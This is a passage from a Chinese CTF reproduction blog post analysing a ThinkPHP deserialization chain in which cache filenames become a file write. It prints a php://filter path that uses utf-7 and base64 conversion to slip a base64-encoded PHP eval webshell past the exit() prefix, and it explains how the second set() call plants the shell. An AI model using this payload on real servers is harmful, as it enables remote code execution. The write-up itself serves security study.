href="https://www.yuque.com/boogipop/iwyn7t/pp7dyy?view=doc_embed">不要捉弄我新人同学：F</a><br>其中filename是通过<code>getCacheKey</code>函数获取的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677553806409-f8d35575-a8fa-41fa-a0c4-2f840283cd59.png#averageHue=%232b2d29&clientId=ucdcb2c75-f9bd-4&from=paste&height=412&id=u91920e7d&name=image.png&originHeight=515&originWidth=1302&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=849735&status=done&style=none&taskId=ue3b49e97-b87d-4730-bda4-3689d8faff7&title=&width=1041.6" alt="image.png"><br>这里的name就是<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，这也就是为什么一开始说会和文件名有关，md5加密后就拼贴在了一起，其中<code>this-&gt;options[&#39;path&#39;]</code>是我们可控的，这里让他为<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code>可以绕过死亡函数<br>但是我们要注意，即使可控文件名，但是文件内容<code>$data</code>，也就是<code>$value</code>在这一次进入set方法不可控，为默认的<code>true</code>，因此即使能创建文件也不能写马<br>继续往下分析会调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677553983389-7717cbfb-4d8d-4d4f-a203-b261414fe296.png#averageHue=%2330302a&clientId=ucdcb2c75-f9bd-4&from=paste&height=90&id=ub70b8af0&name=image.png&originHeight=112&originWidth=782&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118339&status=done&style=none&taskId=u151122b0-663f-438b-bae5-5f97e5b1e3a&title=&width=625.6" alt="image.png"><br>这个filename就是上面拼贴得到的：<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;in &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag) &#123;</span><br><span class="line">        <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag);</span><br><span class="line">      <span class="comment">//this-&gt;tag==true</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>));</span><br><span class="line">            <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">            <span class="variable">$value</span>   = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$value</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在该方法中最后又会调用一次set，然后这次value我们可控，就是传进来的<code>name</code>，也就是filename，这就是死亡函数的第二种形式，文件名和内容一样，在上述文章也有就不分析了，因此在第二次进入set方法成功将马写入</p>
<p>因此一共创建2个文件，第二次创建的文件才是一句话木马：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677554133158-073d3769-d96c-4a78-964a-ac857e0fbcfa.png#averageHue=%2332332e&clientId=ucdcb2c75-f9bd-4&from=paste&height=106&id=ufe866ba2&name=image.png&originHeight=132&originWidth=501&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105069&status=done&style=none&taskId=udfc0570c-5895-4e88-8b96-279e5c5475e&title=&width=400.8" alt="image.png"><br>第二个文件名就是<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php+md5(tag_c4ca4238a0b923820dcc509a6f75849b)+.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677554303467-3637e100-8061-4dc9-afb8-b7197601b72a.png#averageHue=%230f3b3e&clientId=ucdcb2c75-f9bd-4&from=paste&height=2437&id=u0dd4d63a&name=20221011115008-ccb4a1ce-4917-1.png&originHeight=3046&originWidth=1799&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=746691&status=done&style=none&taskId=ud496bfd7-66ed-4853-8185-4d591fc56ed&title=&width=1439.2" alt="20221011115008-ccb4a1ce-4917-1.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/PHP/" class="tag">#PHP</a><a href="/tags/复现/" class="tag">#复现</a><a href="/tags/ThinkPHP/" class="tag">#ThinkPHP</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">FastJson反序列化漏洞</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E8%BF%91%E5%86%B5%E5%92%8C%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">近况和一些思考</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>